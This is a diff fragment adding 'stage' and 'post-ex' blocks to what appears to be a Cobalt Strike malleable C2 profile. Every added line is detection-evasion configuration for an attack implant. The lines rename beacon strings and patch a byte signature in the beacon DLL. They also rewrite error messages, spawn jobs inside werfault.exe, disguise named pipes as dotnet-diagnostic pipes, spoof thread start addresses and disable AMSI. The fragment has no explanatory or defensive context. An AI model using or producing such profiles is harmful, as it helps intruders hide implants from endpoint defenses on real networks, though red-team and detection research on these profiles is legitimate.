@@ -75,3 +75,36 @@ http-post {
         }
     }
 }
+
+stage {
+    set userwx "false";
+    set cleanup "true";
+    set copy_pe_header "false";
+    set module_x64 "Hydrogen.dll";
+
+    transform-x64 {
+        strrep "beacon.x64.dll" "bacon.x64.dll";
+        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
+        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
+        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
+        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
+    }
+}
+
+post-ex {
+    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
+    set cleanup "true";
+    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
+    set amsi_disable "true";
+
+    transform-x64 {
+        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
+        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
+        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
+        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
+        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
+    }
+}
+
+set tasks_max_size "2097152";
